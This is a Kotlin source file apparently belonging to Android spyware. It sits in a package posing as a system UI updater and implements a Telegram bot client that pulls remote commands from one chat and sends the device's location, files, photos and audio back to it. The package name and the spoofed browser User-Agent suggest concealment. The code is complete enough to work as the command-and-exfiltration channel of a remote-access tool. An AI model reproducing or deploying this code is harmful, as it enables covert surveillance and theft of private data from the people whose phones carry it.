package com.android.systemui.updater

import android.content.Context
import android.content.SharedPreferences
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.io.DataOutputStream
import java.io.File
import java.io.IOException
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder
import java.util.ArrayList

/**
 * Telegram client for sending and receiving messages via Telegram Bot API.
 */
class TelegramClient(
    private val context: Context,
    private val botToken: String,
    private val chatId: String
) {
    private companion object {
        private const val TAG = "TelegramClient"
        private const val PREFS_NAME = "telegram_prefs"
        private const val KEY_LAST_UPDATE_ID = "last_update_id"
    }

    private val prefs: SharedPreferences by lazy {
        context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
    }

    /**
     * Fetches new updates from Telegram and processes them.
     * After processing, saves the last update ID to SharedPreferences.
     * @return List of command strings (without slash prefix)
     */
    fun getNewCommands(): List<String> {
        val lastUpdateId = prefs.getLong(KEY_LAST_UPDATE_ID, 0)
        val urlString = "https://api.telegram.org/bot$botToken/getUpdates?offset=${lastUpdateId + 1}&timeout=30"
        val response = httpGet(urlString) ?: return emptyList()
        
        return try {
            val json = JSONObject(response)
            if (!json.getBoolean("ok")) return emptyList()
            
            val updates = json.getJSONArray("result")
            val commands = ArrayList<String>()
            
            for (i in 0 until updates.length()) {
                val update = updates.getJSONObject(i)
                val updateId = update.getLong("update_id")
                val message = update.optJSONObject("message") ?: continue
                
                // Extract chat ID and verify it matches our configured chatId
                val chat = message.optJSONObject("chat")
                val fromChatId = chat?.optString("id") ?: continue
                if (fromChatId != chatId) continue
                
                // Extract text
                val text = message.optString("text", "").trim()
                if (text.isNotEmpty()) {
                    // Remove leading slash if present
                    val command = if (text.startsWith("/")) text.substring(1) else text
                    commands.add(command)
                }
                
                // Save lastUpdateId
                prefs.edit().putLong(KEY_LAST_UPDATE_ID, updateId).apply()
            }
            
            commands
        } catch (e: Exception) {
            ErrorReporter.report(e, "TelegramClient.getNewCommands")
            emptyList()
        }
    }

    /**
     * Sends a text message to the configured chat.
     */
    fun sendText(text: String) {
        val urlString = "https://api.telegram.org/bot$botToken/sendMessage"
        val params = "chat_id=$chatId&text=${URLEncoder.encode(text, "UTF-8")}"
        httpPost(urlString, params)
    }

    /**
     * Sends a location to the configured chat.
     */
    fun sendLocation(latitude: Double, longitude: Double) {
        val urlString = "https://api.telegram.org/bot$botToken/sendLocation"
        val params = "chat_id=$chatId&latitude=$latitude&longitude=$longitude"
        httpPost(urlString, params)
    }

    /**
     * Sends a file to the configured chat.
     */
    fun sendFile(file: File) {
        if (!file.exists()) {
            sendText("❌ File not found: ${file.absolutePath}")
            return
        }
        if (file.length() > 50 * 1024 * 1024) {
            sendText("❌ File too large (max 50MB)")
            return
        }
        multipartUpload("https://api.telegram.org/bot$botToken/sendDocument", file, "document", "")
    }

    /**
     * Sends a photo to the configured chat.
     */
    fun sendPhoto(file: File) {
        if (!file.exists()) {
            sendText("❌ File not found: ${file.absolutePath}")
            return
        }
        if (file.length() > 50 * 1024 * 1024) {
            sendText("❌ File too large (max 50MB)")
            return
        }
        multipartUpload("https://api.telegram.org/bot$botToken/sendPhoto", file, "photo", "")
    }

    /**
     * Sends an audio file to the configured chat.
     */
    fun sendAudio(file: File) {
        if (!file.exists()) {
            sendText("❌ File not found: ${file.absolutePath}")
            return
        }
        if (file.length() > 50 * 1024 * 1024) {
            sendText("❌ File too large (max 50MB)")
            return
        }
        multipartUpload("https://api.telegram.org/bot$botToken/sendAudio", file, "audio", "")
    }

    private fun httpGet(urlStr: String): String? = try {
        val conn = URL(urlStr).openConnection() as HttpURLConnection
        conn.apply {
            requestMethod = "GET"
            connectTimeout = 15000
            readTimeout = 30000
            setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 14; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36")
        }
        val response = conn.inputStream.bufferedReader().readText()
        conn.disconnect()
        response
    } catch (e: IOException) {
        ErrorReporter.report(e, "TelegramClient.httpGet")
        null
    }

    private fun httpPost(urlStr: String, params: String) {
        try {
            val conn = URL(urlStr).openConnection() as HttpURLConnection
            conn.apply {
                requestMethod = "POST"
                doOutput = true
                connectTimeout = 15000
                readTimeout = 30000
                setRequestProperty("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
            }
            conn.outputStream.writer(Charsets.UTF_8).use { it.write(params) }
            val responseCode = conn.responseCode
            if (responseCode != HttpURLConnection.HTTP_OK) {
                throw IOException("HTTP $responseCode")
            }
            conn.disconnect()
        } catch (e: Exception) {
            ErrorReporter.report(e, "TelegramClient.httpPost")
        }
    }

    private fun multipartUpload(
        urlStr: String,
        file: File,
        fileParamName: String,
        caption: String
    ) {
        val boundary = "Boundary${System.currentTimeMillis()}"
        try {
            val conn = URL(urlStr).openConnection() as HttpURLConnection
            conn.apply {
                requestMethod = "POST"
                doOutput = true
                connectTimeout = 30000
                readTimeout = 60000
                setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
            }
            
            DataOutputStream(conn.outputStream).use { out ->
                // chat_id field
                writeMultipartField(out, boundary, "chat_id", chatId)
                
                // caption if provided
                if (caption.isNotEmpty()) {
                    writeMultipartField(out, boundary, "caption", caption)
                }
                
                // File field
                out.writeBytes("--$boundary\r\n")
                out.writeBytes(
                    "Content-Disposition: form-data; name=\"$fileParamName\"; filename=\"${file.name}\"\r\n"
                )
                out.writeBytes("Content-Type: application/octet-stream\r\n\r\n")
                
                file.inputStream().use { fileIn ->
                    val buffer = ByteArray(8192)
                    var bytesRead: Int
                    while (fileIn.read(buffer).also { bytesRead = it } != -1) {
                        out.write(buffer, 0, bytesRead)
                    }
                }
                out.writeBytes("\r\n--$boundary--\r\n")
            }
            
            val responseCode = conn.responseCode
            if (responseCode != HttpURLConnection.HTTP_OK) {
                throw IOException("Upload failed: HTTP $responseCode")
            }
            conn.disconnect()
        } catch (e: Exception) {
            ErrorReporter.report(e, "TelegramClient.multipartUpload")
        }
    }
    
    private fun writeMultipartField(out: DataOutputStream, boundary: String, name: String, value: String) {
        out.writeBytes("--$boundary\r\n")
        out.writeBytes("Content-Disposition: form-data; name=\"$name\"\r\n\r\n")
        out.writeBytes("$value\r\n")
    }
}
